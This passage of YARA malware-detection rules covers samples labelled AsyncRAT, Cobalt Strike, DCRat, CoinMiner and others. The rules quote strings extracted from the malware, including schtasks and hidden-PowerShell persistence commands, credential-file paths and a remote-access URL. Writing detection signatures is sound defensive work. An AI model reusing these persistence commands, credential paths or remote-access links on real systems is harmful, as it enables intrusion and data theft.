      description = "_subset_batch - file ce2c475461d57f222a6aa22f49420f804a43c2eb29abf8553457a7d30f7cb024_ce2c4754.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ce2c475461d57f222a6aa22f49420f804a43c2eb29abf8553457a7d30f7cb024"
   strings:
      $x1 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL" fullword ascii /* score: '32.00'*/
      $x2 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL" fullword ascii /* score: '32.00'*/
      $s3 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s4 = "C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\EXCEL.EXE" fullword ascii /* score: '24.00'*/
      $s5 = "%programdata%\\Microsoft OneDrive Storage\\MimeTypes\\Default\\mimeobj.dll" fullword wide /* score: '24.00'*/
      $s6 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#" wide /* score: '24.00'*/
      $s7 = "mimeobj.dll" fullword wide /* score: '23.00'*/
      $s8 = "pi32.dll" fullword ascii /* score: '20.00'*/
      $s9 = "VBE7.DLL" fullword ascii /* score: '20.00'*/
      $s10 = "*\\G{00020813-0000-0000-C000-000000000046}#1.9#0#C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\EXCEL.EXE#Microsoft " wide /* score: '20.00'*/
      $s11 = "UMicrosoft OneDrive Storage\\MimeTypes\\Default\\mimeobj.dll" fullword wide /* score: '20.00'*/
      $s12 = "advapi32.dll}0" fullword ascii /* score: '19.00'*/
      $s13 = "rrrrrrrrrrrrrrrrrrrrrrr" fullword wide /* reversed goodware string 'rrrrrrrrrrrrrrrrrrrrrrr' */ /* score: '18.00'*/
      $s14 = " Dynamode IDE-->SATA - SATA-->IDE " fullword wide /* score: '17.00'*/
      $s15 = "Scripting.Fil" fullword wide /* score: '16.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e0b72da9 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e0b72da9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e0b72da90fa90f7af1731de7200a87e5cc3dc24cabbb5d062f4d13c572dec8aa"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s3 = "AsyncClient.exe" fullword ascii /* score: '22.00'*/
      $s4 = "/c taskkill.exe /im chrome.exe /f" fullword wide /* score: '19.00'*/
      $s5 = "\\Log.tmp" fullword wide /* score: '17.00'*/
      $s6 = "MutexControl" fullword ascii /* score: '15.00'*/
      $s7 = "WHKEYBOARDLL" fullword ascii /* score: '14.50'*/
      $s8 = "LimeLogger" fullword ascii /* score: '14.00'*/
      $s9 = "loggerPath" fullword ascii /* score: '14.00'*/
      $s10 = "blQ2aTdxRzd1U3FEeGwxUXBKR3dPVkNsRnpwVVY3MWI=" fullword wide /* base64 encoded string 'nT6i7qG7uSqDxl1QpJGwOVClFzpUV71b' */ /* score: '14.00'*/
      $s11 = "getscreen" fullword wide /* score: '13.00'*/
      $s12 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s13 = "passload" fullword wide /* score: '11.00'*/
      $s14 = "AppdataR" fullword ascii /* score: '11.00'*/
      $s15 = "AppdataL" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule be63e6cbf774bb5286870beedc1186c3_imphash_ {
   meta:
      description = "_subset_batch - file be63e6cbf774bb5286870beedc1186c3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "103f27538334160252b7637ab1e312b09d3ee6a611f7eed9d17dd7e52cc2c8d5"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "LoadKey failed." fullword ascii /* score: '10.00'*/
      $s3 = "Base64 decode failed." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule caf9eac983a026863c2ee30bb1cb078b_imphash_ {
   meta:
      description = "_subset_batch - file caf9eac983a026863c2ee30bb1cb078b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "878997e2443054e2299229e8f183cac6f3d9e3260e0c3a31c996498a0d93f8bf"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "LoadKey failed." fullword ascii /* score: '10.00'*/
      $s3 = "Base64 decode failed." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash__157ac9c0 {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash)_157ac9c0.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "157ac9c07d8995cf9d8b140fbf5e7928ab731d5ae85b2b2dcbb763ff4d0cd292"
   strings:
      $s1 = "kzfmzbc4.dll" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10KB and
      all of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash__755267f5 {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash)_755267f5.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "755267f5dedd07a03d3c02e7a1772857abb8f02ff3376dcf7ef15b44b80873fe"
   strings:
      $s1 = "enu1qan2.dll" fullword wide /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10KB and
      all of them
}

rule b21249ff97b698d00cccb1ec32919151_imphash_ {
   meta:
      description = "_subset_batch - file b21249ff97b698d00cccb1ec32919151(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2c3b678b442aea4b3e769493127dedfb22671ea73b634089d5cac18aa2a7bcfc"
   strings:
      $x1 = "\"%s\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"%s\"" fullword ascii /* score: '42.00'*/
      $x2 = "try { $action = New-ScheduledTaskAction -Execute '%s' -WorkingDirectory '%s'; $trigger = New-ScheduledTaskTrigger -AtLogon; $pri" ascii /* score: '35.00'*/
      $x3 = "try { $action = New-ScheduledTaskAction -Execute '%s' -WorkingDirectory '%s'; $trigger = New-ScheduledTaskTrigger -AtLogon; $pri" ascii /* score: '33.00'*/
      $s4 = "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe" fullword ascii /* score: '29.00'*/
      $s5 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s6 = "tmpay0r1ojc.dll" fullword ascii /* score: '26.00'*/
      $s7 = "C:/Windows/SysWOW64/WindowsPowerShell/v1.0/powershell.exe" fullword ascii /* score: '24.00'*/
      $s8 = "[%04d-%02d-%02d %02d:%02d:%02d] DLL loaded - Device Manager status: %s" fullword ascii /* score: '20.00'*/
      $s9 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s10 = "ncipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest; $settings = New-ScheduledTas" ascii /* score: '19.00'*/
      $s11 = "%sinstaller.exe" fullword ascii /* score: '19.00'*/
      $s12 = " $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'System TBnKToJx Service'; Register-ScheduledT" ascii /* score: '17.00'*/
      $s13 = "%sprwjph_log.txt" fullword ascii /* score: '16.00'*/
      $s14 = "start /B \"%s\"" fullword ascii /* score: '11.00'*/
      $s15 = "devmgmt.msc" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule b21249ff97b698d00cccb1ec32919151_imphash__4cc7a111 {
   meta:
      description = "_subset_batch - file b21249ff97b698d00cccb1ec32919151(imphash)_4cc7a111.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4cc7a1117d78f8bf7ab8260916aebf77efaf962b003a29518ad63030c1dc7adf"
   strings:
      $x1 = "\"%s\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"%s\"" fullword ascii /* score: '42.00'*/
      $x2 = "try { $action = New-ScheduledTaskAction -Execute '%s' -WorkingDirectory '%s'; $trigger = New-ScheduledTaskTrigger -AtLogon; $pri" ascii /* score: '35.00'*/
      $x3 = "try { $action = New-ScheduledTaskAction -Execute '%s' -WorkingDirectory '%s'; $trigger = New-ScheduledTaskTrigger -AtLogon; $pri" ascii /* score: '33.00'*/
      $s4 = "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe" fullword ascii /* score: '29.00'*/
      $s5 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s6 = "tmpnz8x72of.dll" fullword ascii /* score: '26.00'*/
      $s7 = "C:/Windows/SysWOW64/WindowsPowerShell/v1.0/powershell.exe" fullword ascii /* score: '24.00'*/
      $s8 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s9 = "[%04d-%02d-%02d %02d:%02d:%02d] DLL loaded - Text Editor status: %s" fullword ascii /* score: '20.00'*/
      $s10 = "ncipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest; $settings = New-ScheduledTas" ascii /* score: '19.00'*/
      $s11 = "%sinstaller.exe" fullword ascii /* score: '19.00'*/
      $s12 = " $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'System pKRkIwQP Service'; Register-ScheduledT" ascii /* score: '17.00'*/
      $s13 = "%sfbnfcy_log.txt" fullword ascii /* score: '16.00'*/
      $s14 = "start /B \"%s\"" fullword ascii /* score: '11.00'*/
      $s15 = "curl_pushheader_bynum" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__b08fa220035a09d82cea43612665d558_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_b08fa220035a09d82cea43612665d558(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "056fcb7584cfb525587486c8117d70a0d83a213b415361fcca0e3fe9c5e1f7df"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "jqudPr.dll" fullword ascii /* score: '23.00'*/
      $s3 = "AVPMAI_DLL" fullword ascii /* score: '9.00'*/
      $s4 = "* }U]Sa" fullword ascii /* score: '9.00'*/
      $s5 = "* CR0M" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule Cobalt_Strike_signature__6312da79b12e9112d07c19c84457c36a_imphash_ {
   meta:
      description = "_subset_batch - file Cobalt Strike(signature)_6312da79b12e9112d07c19c84457c36a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d3db55cd5677b176eb837a536b53ed8c5eabbfd68f64b88dd083dc9ce9ffb64e"
   strings:
      $s1 = "xtoofou674xh.dll" fullword ascii /* score: '23.00'*/
      $s2 = "witnessed workroom authoritative bail advertise navy unseen co rival June quest manage detest predicate mainland smoke proudly s" ascii /* score: '22.00'*/
      $s3 = " wig promise heal tangible reflections high elevate genus England wild chairman multitude jaws keyhole fairy rainy starts lease " ascii /* score: '12.00'*/
      $s4 = "deplore word excellent consume left hers being tyre squeeze developed ardour fertility lucidly lion loft conquered grant restart" ascii /* score: '11.00'*/
      $s5 = ".text$wlogeu" fullword ascii /* score: '9.00'*/
      $s6 = "ch pensioner pub continual peaceable software beech indeed compromise assign comprehensive suitable disturbed oblige saw trying " ascii /* score: '9.00'*/
      $s7 = "ic hairs species provision cocoa standard curtains discussed envelope books publicity interrupt sailor wilderness promising try " ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule CobaltStrike_signature__8892181748c61660b1283058a8498a12_imphash_ {
   meta:
      description = "_subset_batch - file CobaltStrike(signature)_8892181748c61660b1283058a8498a12(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b4e6fdd393c8a8768621713667c5e239b0df92cff2741513bdc2b03e3b453082"
   strings:
      $s1 = "failed to to lock cleanup mutex" fullword ascii /* score: '20.00'*/
      $s2 = "failed to to lock creation mutex" fullword ascii /* score: '20.00'*/
      $s3 = "C:\\crossdev\\gccmaster\\build-tdm64\\runtime\\mingw-w64-crt" fullword ascii /* score: '16.00'*/
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s5 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s6 = "mutex.c" fullword ascii /* score: '15.00'*/
      $s7 = "mutex_name" fullword ascii /* score: '15.00'*/
      $s8 = "mutex_impl_init" fullword ascii /* score: '15.00'*/
      $s9 = "failed to get string from atom" fullword ascii /* score: '14.00'*/
      $s10 = ".reloc_target" fullword ascii /* score: '14.00'*/
      $s11 = "C:\\crossdev\\gccmaster\\build-tdm64\\gcc-seh\\x86_64-w64-mingw32\\libgcc" fullword ascii /* score: '13.00'*/
      $s12 = "pthread_getname_np" fullword ascii /* score: '12.00'*/
      $s13 = "_pthread_get_tick_count" fullword ascii /* score: '12.00'*/
      $s14 = "GNU C17 10.3.0 -mtune=generic -march=x86-64 -g -O2 -O2 -O2 -fbuilding-libgcc -fno-stack-protector" fullword ascii /* score: '12.00'*/
      $s15 = "GNU C99 10.3.0 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule CoinMiner_signature__de41d4e0545d977de6ca665131bb479a_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_de41d4e0545d977de6ca665131bb479a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d8d4c136068c9c5aad47a796b1e5f075bae4ded6c9e547ddba00ca9e112cb279"
   strings:
      $s1 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s2 = "5&, -?';/^4/)" fullword ascii /* score: '13.00'*/ /* hex encoded string 'T' */
      $s3 = "%'7(\\.)+ 0" fullword ascii /* score: '13.00'*/ /* hex encoded string 'p' */
      $s4 = "&4++ 66[(F(" fullword ascii /* score: '13.00'*/ /* hex encoded string 'Fo' */
      $s5 = ";=5%- 8[\\!" fullword ascii /* score: '13.00'*/ /* hex encoded string 'X' */
      $s6 = "7C :+ ?\"" fullword ascii /* score: '13.00'*/ /* hex encoded string '|' */
      $s7 = "# 5\\!4'\\" fullword ascii /* score: '13.00'*/ /* hex encoded string 'T' */
      $s8 = "=\"4-@/1'+ 5.#6-" fullword ascii /* score: '13.00'*/ /* hex encoded string 'AV' */
      $s9 = "2\".+ .#6" fullword ascii /* score: '13.00'*/ /* hex encoded string '&' */
      $s10 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s11 = "DigiCert Timestamp 2022 - 20" fullword ascii /* score: '12.00'*/
      $s12 = "\\7%'( /@A" fullword ascii /* score: '10.00'*/ /* hex encoded string 'z' */
      $s13 = "\\/$%*.6]&,7" fullword ascii /* score: '10.00'*/ /* hex encoded string 'g' */
      $s14 = "\\4+A*)%]" fullword ascii /* score: '10.00'*/ /* hex encoded string 'J' */
      $s15 = "\\4\\?<E!" fullword ascii /* score: '10.00'*/ /* hex encoded string 'N' */
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule ConnectWise_signature__c2fe6927e1db8cf00400dbef9e5d35be_imphash_ {
   meta:
      description = "_subset_batch - file ConnectWise(signature)_c2fe6927e1db8cf00400dbef9e5d35be(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b534bfc64a48344ea9f9122dae81e82851b2d06560840ba93fc68876f00efc79"
   strings:
      $s1 = "C:\\builds\\cc\\cwcontrol\\Product\\ClickOnceRunner\\Release\\ClickOnceRunner.pdb" fullword ascii /* score: '25.00'*/
      $s2 = "https://social.thecharte.com/Bin/ScreenConnect.Client.application?e=Support&y=Guest&h=social.thecharte.com&p=8041&s=c8b939ad-503" wide /* score: '16.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s5 = ">(?/?4?8?<?@?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'H' */
      $s6 = "nullptr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule CoinMiner_signature__7dbd2319b33ed25eb7ad7d0162c2bb3a_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_7dbd2319b33ed25eb7ad7d0162c2bb3a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "04283d0ced8512f0d15a2d002c1332ddfa48b41fcfd78df120f4e907a6f8260d"
   strings:
      $s1 = "                <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s2 = "/+'&4.675" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Fu' */
      $s3 = "`?QeXeCH" fullword ascii /* score: '9.00'*/
      $s4 = "- /erI" fullword ascii /* score: '9.00'*/
      $s5 = "43+#$6?+:#=7!/" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Cg' */
      $s6 = "obkvvgifilddzpkfmgxsrehntf" fullword ascii /* score: '8.00'*/
      $s7 = "ifilddzpkfmgxsrehntfxuswkjobkvvg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule Cobalt_Strike_signature__864c68888d03d394dd3a666a769d8616_imphash_ {
   meta:
      description = "_subset_batch - file Cobalt Strike(signature)_864c68888d03d394dd3a666a769d8616(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9089449f924cdfa352c72baef5aec7459fd3dcaf01427efe07f387272968703e"
   strings:
      $s1 = "LoggingPlatform.dll" fullword wide /* score: '28.00'*/
      $s2 = "AtomLdr.dll" fullword ascii /* score: '23.00'*/
      $s3 = "* |^eT|=" fullword ascii /* score: '9.00'*/
      $s4 = "Logging Platform" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule cb634a7f159d14dfd59774634ef6c080d432c406fb8a91f4d1073204c03a998e_cb634a7f {
   meta:
      description = "_subset_batch - file cb634a7f159d14dfd59774634ef6c080d432c406fb8a91f4d1073204c03a998e_cb634a7f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cb634a7f159d14dfd59774634ef6c080d432c406fb8a91f4d1073204c03a998e"
   strings:
      $s1 = "Mdkrfps.exe" fullword wide /* score: '22.00'*/
      $s2 = "ProcessIdentifiableHandler" fullword ascii /* score: '18.00'*/
      $s3 = "ProcessPassiveHandler" fullword ascii /* score: '18.00'*/
      $s4 = "ProcessStatelessHandler" fullword ascii /* score: '15.00'*/
      $s5 = "OrderProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessConcreteHandler" fullword ascii /* score: '15.00'*/
      $s7 = "ProcessSortedHandler" fullword ascii /* score: '15.00'*/
      $s8 = "RefineReadableTemplate" fullword ascii /* score: '14.00'*/
      $s9 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s10 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s11 = "Decompressed" fullword ascii /* score: '9.00'*/
      $s12 = "get_Iptilosy" fullword ascii /* score: '9.00'*/
      $s13 = "set_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s14 = "* zG{'" fullword ascii /* score: '9.00'*/
      $s15 = "TraverseControllableVisitor" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__291348d4 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_291348d4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "291348d4f999727b96cbcded3c6b7b8a0628d7c49e7ae7c58cbc3062fdbdbff3"
   strings:
      $x1 = "H4sIAAAAAAAEAOy9XWvrytYu+FdUpCTkQvKFHSZvkI/JxgZhBURUN8I3lmRIL6aFHc/EkzjG+Lf384ySnGSutc/p7rzdB5p9EdbSHK6PUePrGfX5P/5H8X/8jOeX4zRc" wide /* score: '50.00'*/
      $s2 = "%AppData% - Very Fast" fullword wide /* score: '26.00'*/
      $s3 = "schtasks.exe /create /tn \"" fullword wide /* score: '24.00'*/
      $s4 = "%UsersFolder% - Fast" fullword wide /* score: '24.00'*/
      $s5 = "Telegram.exe" fullword wide /* score: '22.00'*/
      $s6 = "schtasks.exe /delete /tn \"" fullword wide /* score: '21.00'*/
      $s7 = "/config/loginusers.vdf" fullword wide /* score: '21.00'*/
      $s8 = "%SystemDrive% - Slow" fullword wide /* score: '19.00'*/
      $s9 = "H4sIAAAAAAAEAFWSzXKCMBSFH6ibxpnadtGFRVNDBSSGK7BTKxoI1Y50UJ++QU5m7CKT+80594dw397iwoTT9T6vIx0nsW4X+fW8zOpjKeYh/WPFK3ESi0K3/OvKa7l7" wide /* score: '19.00'*/
      $s10 = "-Command \"" fullword wide /* score: '16.00'*/
      $s11 = "\" /sc ONLOGON /tr \"'" fullword wide /* score: '16.00'*/
      $s12 = "HKEY_CLASSES_ROOT\\tdesktop.tg\\shell\\open\\command" fullword wide /* score: '16.00'*/
      $s13 = "~Work.log" fullword wide /* score: '16.00'*/
      $s14 = "gettoken" fullword wide /* score: '16.00'*/
      $s15 = "AutoLoginUser" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AsyncRAT_signature__c38362e0e37590c08f252fc98b1f0136_imphash_ {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_c38362e0e37590c08f252fc98b1f0136(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eae00f35df37b967e5876281d5ef6dd2c46516c59381d93078ab16278c5e1712"
   strings:
      $s1 = "konlinesetup.exe" fullword wide /* score: '22.00'*/
      $s2 = "processorArchitecture='X86'" fullword ascii /* score: '15.00'*/
      $s3 = "processorArchitecture='*'" fullword ascii /* score: '15.00'*/
      $s4 = "publicKeyToken='6595b64144ccf1df'" fullword ascii /* score: '13.00'*/
      $s5 = "version='6.0.0.0'" fullword ascii /* score: '12.00'*/
      $s6 = "version='1.0.0.0'" fullword ascii /* score: '12.00'*/
      $s7 = "<!--The ID below indicates app support for Windows 10 -->" fullword ascii /* score: '12.00'*/
      $s8 = "name='Microsoft.Windows.Common-Controls'" fullword ascii /* score: '11.00'*/
      $s9 = "oplog l" fullword ascii /* score: '11.00'*/
      $s10 = "TdPipeA\"" fullword ascii /* score: '10.00'*/
      $s11 = "<description>Green software</description>" fullword ascii /* score: '10.00'*/
      $s12 = "_6 /y <=" fullword ascii /* score: '9.00'*/
      $s13 = " 64\\6$$/A" fullword ascii /* score: '9.00'*/ /* hex encoded string 'dj' */
      $s14 = "WGetAJiveC" fullword ascii /* score: '9.00'*/
      $s15 = "* l'$(" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule CobaltStrike_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash_ {
   meta:
      description = "_subset_batch - file CobaltStrike(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3cc5353c3b60c0f0e8389c14bdf693f95ea56eced0616642b758b3bbc45d3cc5"
   strings:
      $s1 = "3242526272" ascii /* score: '17.00'*/ /* hex encoded string '2BRbr' */
      $s2 = "!dWdhWHRx" fullword ascii /* base64 encoded string 'ugaXtq' */ /* score: '14.00'*/
      $s3 = "))&]'''4!!!" fullword ascii /* score: '10.00'*/
      $s4 = "6WrCNBZ.ZhX" fullword ascii /* score: '10.00'*/
      $s5 = "(((f%%%7!!!" fullword ascii /* score: '10.00'*/
      $s6 = "))&i))&]))&P))&C%%%7###+''' !!!" fullword ascii /* score: '10.00'*/
      $s7 = "ZpWT.GxN" fullword ascii /* score: '10.00'*/
      $s8 = "51&w(((_**'N)))>++%/%%%\"!!!" fullword ascii /* score: '10.00'*/
      $s9 = "mdNUL:\\/" fullword ascii /* score: '10.00'*/
      $s10 = "jFROIrC" fullword ascii /* score: '9.00'*/
      $s11 = "rAAe^tziRC" fullword ascii /* score: '9.00'*/
      $s12 = "SpYS'$:r" fullword ascii /* score: '9.00'*/
      $s13 = "* %h.9" fullword ascii /* score: '9.00'*/
      $s14 = "''\"4))&c" fullword ascii /* score: '9.00'*/ /* hex encoded string 'L' */
      $s15 = "apcGetvf" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule DarkCloud_signature__01522b04 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_01522b04.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "01522b046102891deaf301f6dfea2c0f39d290b118771c9aecba1b7eeecfb952"
   strings:
      $s1 = "qwwwwwwww" fullword ascii /* reversed goodware string 'wwwwwwwwq' */ /* score: '18.00'*/
      $s2 = "<EduMp\\H3r\"" fullword ascii /* score: '14.00'*/
      $s3 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s4 = "* \"`!\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule AsyncRAT_signature__c6a9bf1f {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_c6a9bf1f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c6a9bf1f17099352d2823ec20b6ad37f8737d371f876ba6249ecddce9655ebd0"
   strings:
      $s1 = "46,51,50,51,56,57,46,51,50,51,56,58,46,58,58,57,55,46,59,56,58,57,46,59,53,54,46,58,56,50,51,46,58,55,59,55,46,58,57,54,58,46,51" ascii /* score: '9.00'*/ /* hex encoded string 'FQPQVWFQPQVXFXXWUFYVXWFYSTFXVPQFXUYUFXWTXFQ' */
      $s2 = "56,58,57,46,58,57,53,57,46,59,58,59,57,46,51,50,51,56,51,46,51,58,55,46,58,57,55,53,46,51,50,50,56,51,46,59,57,53,54,46,51,50,51" ascii /* score: '9.00'*/ /* hex encoded string 'VXWFXWSWFYXYWFQPQVQFQXUFXWUSFQPPVQFYWSTFQPQ' */
      $s3 = "46,59,57,55,57,46,51,58,50,46,51,50,50,53,53,46,58,58,50,57,46,59,56,59,56,46,59,58,58,58,46,59,57,53,51,46,51,50,51,55,51,46,59" ascii /* score: '9.00'*/ /* hex encoded string 'FYWUWFQXPFQPPSSFXXPWFYVYVFYXXXFYWSQFQPQUQFY' */
      $s4 = "53,52,46,59,56,55,53,46,58,58,57,56,46,59,57,55,58,46,59,56,55,54,46,51,50,51,55,58,46,51,50,50,55,58,46,51,50,50,54,59,46,59,59" ascii /* score: '9.00'*/ /* hex encoded string 'SRFYVUSFXXWVFYWUXFYVUTFQPQUXFQPPUXFQPPTYFYY' */
      $s5 = "53,54,46,59,56,54,55,46,51,50,50,55,50,46,59,58,59,52,46,58,57,55,59,46,59,57,58,58,46,51,50,51,53,55,46,51,50,50,53,54,46,51,58" ascii /* score: '9.00'*/ /* hex encoded string 'STFYVTUFQPPUPFYXYRFXWUYFYWXXFQPQSUFQPPSTFQX' */
      $s6 = "46,51,52,54,58,56,46,59,59,59,56,46,51,58,55,46,59,59,50,52,46,59,59,50,51,46,59,58,59,58,46,51,50,50,54,50,46,58,58,50,58,46,51" ascii /* score: '9.00'*/ /* hex encoded string 'FQRTXVFYYYVFQXUFYYPRFYYPQFYXYXFQPPTPFXXPXFQ' */
      $s7 = "46,51,50,51,55,55,46,59,58,53,57,46,58,57,53,53,46,59,58,53,59,46,51,50,50,53,54,46,51,50,50,53,57,46,59,56,57,55,46,59,57,54,55" ascii /* score: '9.00'*/ /* hex encoded string 'FQPQUUFYXSWFXWSSFYXSYFQPPSTFQPPSWFYVWUFYWTU' */
